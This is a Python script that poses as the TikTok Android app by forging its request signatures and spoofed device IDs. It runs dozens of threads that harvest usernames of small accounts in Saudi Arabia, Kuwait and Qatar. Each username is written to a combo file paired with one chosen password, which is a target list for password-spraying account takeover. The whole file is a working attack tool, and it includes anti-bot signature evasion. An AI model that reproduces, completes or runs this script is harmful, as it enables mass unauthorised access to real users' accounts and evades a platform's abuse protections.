#<⏤͟͞𝗦𝗘𝗠𝗢🇮🇶 -[""]>
import requests
from MedoSigner import Argus,Gorgon,Ladon,md5
import os, urllib.parse, re, random, binascii, uuid, time, threading
from queue import Queue
a = 0
RG = ['SA']
users = set()
user_queue = Queue()
lock = threading.Lock()


def Vals():
	return {"manifest_version_code": "330802", "_rticket": str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632", "app_language": "ar", "app_type": "normal", "iid": str(random.randint(1, 10**19)), "channel": "googleplay", "device_type": "RMX3511", "language": "ar", "host_abi": "arm64-v8a", "locale": "ar", "resolution": "1080*2236", "openudid": str(binascii.hexlify(os.urandom(8)).decode()), "update_version_code": "330802", "ac2": "lte", "cdid": str(uuid.uuid4()), "sys_region": "IQ", "os_api": "33", "timezone_name": "Asia/Baghdad", "dpi": "360", "carrier_region": "IQ", "ac": "4g", "device_id": str(random.randint(1, 10**19)), "os_version": "13", "timezone_offset": "10800", "version_code": "330802", "app_name": "musically_go", "ab_version": "33.8.2", "version_name": "33.8.2", "device_brand": "realme", "op_region": "IQ", "ssmix": "a", "device_platform": "android", "build_number": "33.8.2", "region": "IQ", "aid": "1340", "ts": str(round(random.uniform(1.2, 1.6) * 100000000) * -1)}, {'User-Agent': 'com.zhiliaoapp.musically/2023001020 (Linux; U; Android 13; ar; RMX3511; Build/TP1A.220624.014; Cronet/TTNetVersion:06d6a583 2023-04-17 QuicVersion:d298137e 2023-02-13)'}

def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
	x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
	data=payload
	if not unix: unix = int(time.time())
	return Gorgon(params, unix, payload, cookie).get_value() | { 
		"x-ladon": Ladon.encrypt(unix, license_id, aid),
		"x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)}
pwd = input('Enter Password: ')

def pas(username: str,user_id):
  ussr = ''.join(re.findall(r'[a-zA-Z]', username)) 
  hh = []
  
  hh.append(f"{username}:{pwd}")	
  return hh

def file(username,user_id):
	account = pas(username,user_id)
	with open("data\combo.txt", "a", encoding="utf-8") as f:
		for line in account:
			f.write(line + "\n")

def get_following(user_id):
	global users, a
	token = None
	while True:
		try:
			p, h = Vals()
			signed = sign(params=urllib.parse.urlencode(p), payload="", cookie="")
			h.update({
				'x-ss-req-ticket': signed['x-ss-req-ticket'],
				'x-argus': signed["x-argus"],
				'x-gorgon': signed["x-gorgon"],
				'x-khronos': signed["x-khronos"],
				'x-ladon': signed["x-ladon"]
			})
			base_url = f'https://api16-normal-c-alisg.tiktokv.com/lite/v2/relation/following/list/?user_id={user_id}&count=50&source_type=1&request_tag_from=h5&{urllib.parse.urlencode(p)}'
			if token:
				base_url += f"&page_token={urllib.parse.quote(token)}"
			response = requests.get(base_url, headers=h)
			data = response.json()
			for user in data.get("followings", []):
				reg = user.get("region")
				fol = user.get("follower_count")
				username = user.get("unique_id")
				with lock:
					if reg in ['SA', 'KW', 'QA']:
						if 0 < int(fol) < 10000 and username not in users:
							a += 1
							users.add(username)
							print(f'{a} - {username} | {fol} | {reg}')
							file(username,user_id)
			if not data.get("has_more"):
				break
			token = data.get("next_page_token")
			if not token:
				break
		except: ''

def info(username):
	global users
	headers = {
		"user-agent": "Mozilla/5.0 (Windows NT 10.0; Android 10; Pixel 3 Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6394.70 Mobile Safari/537.36 trill_350402 JsSdk/1.0 NetType/MOBILE Channel/googleplay AppName/trill app_version/35.3.1 ByteLocale/en ByteFullLocale/en Region/IN AppId/1180 Spark/1.5.9.1 AppVersion/35.3.1 BytedanceWebview/d8a21c6"
	}
	try:
		tikinfo = requests.get(f'https://www.tiktok.com/@{username}', headers=headers).text
		info = str(tikinfo.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
		try:
			user_id = str(info.split('id":"')[1]).split('",')[0]
			country = str(info.split('region":"')[1]).split('",')[0]
			following = str(info.split('followingCount":')[1]).split(',"')[0]
			
			with lock:
				if username not in users and int(following) >= 100:
					users.add(username)
					user_queue.put(user_id)
					
		except:
			pass
	except:
		pass
def worker():
	while True:
		try:
			user_id = user_queue.get()
			get_following(user_id)
			user_queue.task_done()
		except:
			pass
def V12():
	kew = random.choice(["qwertyuioplkjhgfdsazxcvbnm",'ضصثقفغعهخحجطكمنتالبيسشذءؤرىةوزظد'])
	k = ''.join((random.choice(kew) for i in range(random.randrange(3, 9))))
	return k  

def search():
	while True:
		try:
			username = V12()
			url = "https://search16-normal-c-alisg.tiktokv.com/aweme/v1/search/user/sug/?iid="+str(random.randint(1, 10**19))+"&device_id="+str(random.randint(1, 10**19))+"&ac=wifi&channel=googleplay&aid=1233&app_name=musical_ly&version_code=300102&version_name=30.1.2&device_platform=android&os=android&ab_version=30.1.2&ssmix=a&device_type=RMX3511&device_brand=realme&language=ar&os_api=33&os_version=13&openudid="+str(binascii.hexlify(os.urandom(8)).decode())+"&manifest_version_code=2023001020&resolution=1080*2236&dpi=360&update_version_code=2023001020&_rticket="+str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632"+"&current_region=IQ&app_type=normal&sys_region=IQ&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=IQ&app_language=ar&carrier_region=IQ&ac2=wifi&uoo=0&op_region=IQ&timezone_offset=10800&build_number=30.1.2&host_abi=arm64-v8a&locale=ar&region=IQ&content_language=gu%2C&ts="+str(round(random.uniform(1.2, 1.6) * 100000000) * -1)+"&cdid="+str(uuid.uuid4())+""			
			payload = {
			  'keyword': username,
			  'count': "100",
			  'source': "tt_ffp_add_friends",
			  'mention_type': "0"}		  
			headers = {'Host': 'search16-normal-c-alisg.tiktokv.com','User-Agent': "com.zhiliaoapp.musically/2023105030 (Linux; U; Android 13; ar_IQ; RMX3511; Build/TP1A.220624.014; Cronet/TTNetVersion:2fdb62f9 2023-09-06 QuicVersion:bb24d47c 2023-07-19)"}
			headers.update(sign(url.split('?')[1], payload=urllib.parse.urlencode(payload)))
			response = requests.post(url, data=payload, headers=headers)
			data = response.json()
			ids = [
			    item["extra_info"].get("sug_uniq_id")
			    for item in data.get("sug_list", [])
			    if "extra_info" in item 
			    and "sug_uniq_id" in item["extra_info"]
			    and re.fullmatch(r"[A-Za-z0-9_]+", item["extra_info"]["sug_uniq_id"])]
			for user in ids:
				info(user)
		except:
			print('Error in Search')	
for _ in range(50):
	threading.Thread(target=worker, daemon=True).start()
for _ in range(40):
	threading.Thread(target=search).start()
